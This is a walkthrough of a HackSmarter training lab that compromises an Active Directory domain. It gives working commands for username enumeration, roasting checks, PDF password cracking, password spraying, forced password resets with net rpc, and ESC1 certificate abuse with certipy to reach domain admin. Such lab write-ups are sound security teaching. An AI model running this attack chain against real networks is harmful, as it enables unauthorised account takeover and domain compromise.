---
title: "HackSmarter Welcome Walkthrough  "
date: 2026-05-29 00:00:00 +0000
categories: [ HackSmarter]
tags: [Hacksmarter , Active Directory]
---


## Scenario : 


You are a member of the Hack Smarter Red Team. During a phishing engagement, you were able to retrieve credentials for the client's Active Directory environment. Use these credentials to enumerate the environment, elevate your privileges, and demonstrate impact for the client.


## Solution : 

Before we start make sure to add the Domain and hostname to the /etc/hosts . 

<img width="1218" height="572" alt="image" src="https://github.com/user-attachments/assets/77dd7dc8-1a92-4e7d-b30d-b03b489789e2" />


We first start with an nmap scan . 

```bash
export target=10.1.240.197
nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN Open_Ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v -oN Nmap_sV_sC_Results.txt && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN Nmap_Vuln_Results.txt
```

<img width="1304" height="748" alt="image" src="https://github.com/user-attachments/assets/ed8b8882-6dfa-45f7-ad4e-8df13828a836" />

From the first scan , we find port 88 and Ldap on 389 as well as DNS , this proves that this is the DC , since this is an AD machine i will be following this quick checklist : 

```bash
Scan All TCP Ports : Check The useful note Down for more info .
Check ldap , rpc , smb with anonymous access . Check for Public Shares .
Find Usernames : Find usernames in Web Site and generate a Username List maybe . if you get access , Look for usernames using netexec , –rid-brute , –users and enumdomuser with RPC client .
Check usernames found with kerbrute .
Search for ASREP Roastable Users .
Once we have valid Creds : Check Kerberoastable users + Spray the password on all users .
Try to authenticate using every protocol .
Enumerate shares with those Users found . Use netexec to download .
Check Certipy for Vulnerable Templates if there is an ADCS in place .
If we get a Shell , try privesc , dump all Hashes using netexec or locally and store into a file .
If we can’t privesc , we can move to Blood Hound .
```

We already have these credentials to start with :  e.hills:Il0vemyj0b2025!

Now fist thing i did was generate a list of usernames to test for ASREPROASTING , and Kerberoasting as well before moving to Shares enumeration . 

```bash
nxc smb $target -u 'e.hills' -p 'Il0vemyj0b2025!' --rid-brute  | grep -i 'sidtypeuser' | awk '{print$6}' | cut -d '\' -f 2 | tee users.txt
```

<img width="1788" height="462" alt="image" src="https://github.com/user-attachments/assets/6cddfc57-3b4b-4070-ab62-f0df8f5a0395" />

```bash
impacket-GetNPUsers  WELCOME.LOCAL/ -dc-ip $target -usersfile users.txt -outputfile Hashes.txt
```
<img width="1284" height="632" alt="image" src="https://github.com/user-attachments/assets/6a754d21-1a0d-4ff2-af55-e334ef9cb836" />

No users are ASREPROASTABLE , let's try Kerberoasting : 

```bash
nxc ldap  $target -u 'e.hills' -p 'Il0vemyj0b2025!' --kerberoast Hashessss
```

<img width="1280" height="464" alt="image" src="https://github.com/user-attachments/assets/2365f4ac-677e-45f5-8dc4-aeaf251eb206" />

No users are kerberoastable as well , let's check the Shares . 

<img width="1316" height="643" alt="image" src="https://github.com/user-attachments/assets/957cc482-8212-4674-bbca-ef9ea5caf274" />

We see the Human Resource Share that we are able to read , let's connect using smbclient and Download everything , to download all files at once :

```bash
recurse on 
prompt off
mget * 
```

<img width="1067" height="717" alt="image" src="https://github.com/user-attachments/assets/1d21e986-a36f-4946-a465-f262995975ff" />

Now upon opening all the documents , we find one that is password protected , the rest isn't really that useful . 

<img width="1582" height="846" alt="image" src="https://github.com/user-attachments/assets/d499d831-9893-4293-a45b-ea2b7241a5d7" />

We can try using john to crack the password protecting the PDF with a wordlist like rockyou and hope for the best . 

<img width="1192" height="580" alt="image" src="https://github.com/user-attachments/assets/26d8fd12-90b4-44d5-9153-444ceb3bcb55" />

We do manage to crack it . Now upon opening the file we find the temporary default password : 

<img width="1181" height="797" alt="image" src="https://github.com/user-attachments/assets/01d44eac-86a5-444a-954e-fc20345b352e" />

Now we can try spraying this password with the user list we gethered earlier , maybe a user still has the default one . 

<img width="1428" height="584" alt="image" src="https://github.com/user-attachments/assets/e5487c1a-3d35-46ff-ab7c-d6189ed67d57" />

Perfect now we've got a new user . From here i decided to use BloodHound to speed things up , see what permissions our user has inside the domain , trying to map the fastest way to domain Admin . here are the commands to setup Bloodhound as well as the injestor . 

```bash
# To get the ZIP file :
nxc ldap $target -u 'e.hills' -p 'Il0vemyj0b2025!' --bloodhound --collection All --dns-server $target
# To run BloodHound : 
https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
sudo ./bloodhound-cli install
./bloodhound-cli resetpwd
Visit : http://localhost:8080/ui/login 
```
<img width="1790" height="469" alt="image" src="https://github.com/user-attachments/assets/a5561d40-83c1-4354-ba2a-54b6fdb2d455" />

Now just add the new user to Owned Objects . from the OutBound connection , we see that we have Generic All over I.Park since we are members of the Human Resource group . 

<img width="1606" height="549" alt="image" src="https://github.com/user-attachments/assets/e77f7b47-1eaa-4911-b379-9d846267f95a" />

From BloodHound we see that we can abuse it from Linux using net rpc to Force the changing of the user's password . 

```bash
net rpc password "I.PARK" "Password123@" -U 'WELCOME.local\a.harris%Welcome2025!@'  -S "DC01.WELCOME.local"

==> Use '' instead of "" so that the @ ! , don't break the syntax . 
```
<img width="1411" height="322" alt="image" src="https://github.com/user-attachments/assets/b1d28251-af39-40c8-bc84-6dc70273a0bf" />

Perfect now let's see if this user has any privileges . 

<img width="1219" height="449" alt="image" src="https://github.com/user-attachments/assets/ea212964-c85a-4ded-a082-ab111b39f480" />

We see that we have Force Change password on both users , we will first start with the SVC_CA as the CA always has more privileges , once again we can use the net rpc command on Kali to do so.  

<img width="1061" height="542" alt="image" src="https://github.com/user-attachments/assets/87ffb895-0a53-4240-9139-dc183c3ca419" />

```bash
net rpc password "I.PARK" "Password123@" -U 'WELCOME.local\a.harris%Welcome2025!@'  -S "DC01.WELCOME.local"

net rpc password "SVC_CA" "Weak123@" -U "WELCOME.local\I.PARK%Password123@" -S "DC01.WELCOME.local"
```

<img width="1355" height="521" alt="image" src="https://github.com/user-attachments/assets/0b53a2d3-87db-48c6-8739-a22d517085fd" />

Since this is a CA service account , let's check certipy to see if we can abuse any of the templates . 

```bash
certipy-ad find -u 'SVC_CA' -p 'Weak123@' -dc-ip $target -stdout -vulnerable
```

<img width="1370" height="610" alt="image" src="https://github.com/user-attachments/assets/cb2fb82f-0b60-42a4-9956-b8af7a1b4390" />

Perfect to abuse ESC1 , i decided to follow this guide from certipy wiki . 

```bash
https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
```
What we will need is the SID of the domain administrator 

```bash
certipy-ad  account -u 'SVC_CA' -p 'Weak123@' -dc-ip 10.1.240.197 -user 'administrator' read
```

<img width="1454" height="591" alt="image" src="https://github.com/user-attachments/assets/faa8051c-6212-4d67-8fe4-48de09c0c0d0" />

```bash
From the Guide : 
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'VulnTemplate' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'

For our case : 
certipy-ad req \
    -u 'SVC_CA@Welcome.local' -p 'Weak123@' \   
    -dc-ip $target -target 'DC01.WELCOME.local' \
    -ca 'WELCOME-CA' -template 'Welcome-Template' \
    -upn 'administrator@welcome.local' -sid 'S-1-5-21-141921413-1529318470-1830575104-500'

```
All information can be found in the certipy output from earlier (eg: CA name , template name , ....) 

<img width="1042" height="770" alt="image" src="https://github.com/user-attachments/assets/82ff30af-6788-4226-8c0a-8b9f6b5d70fe" />

Now finally we use the newly created pfx cert to authenticate as the administrator : 

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip $target
```
<img width="1305" height="428" alt="image" src="https://github.com/user-attachments/assets/ad166ac6-4dec-434f-9445-1e944e2d91df" />

Perfect , we get the Domain Admin Hash that way , we can login and get our flags , perform DCSync ...

<img width="1783" height="781" alt="image" src="https://github.com/user-attachments/assets/6dfa97c8-1087-4268-8dea-ea6681d65edf" />

That was it for this lab , see you in the next one :) 
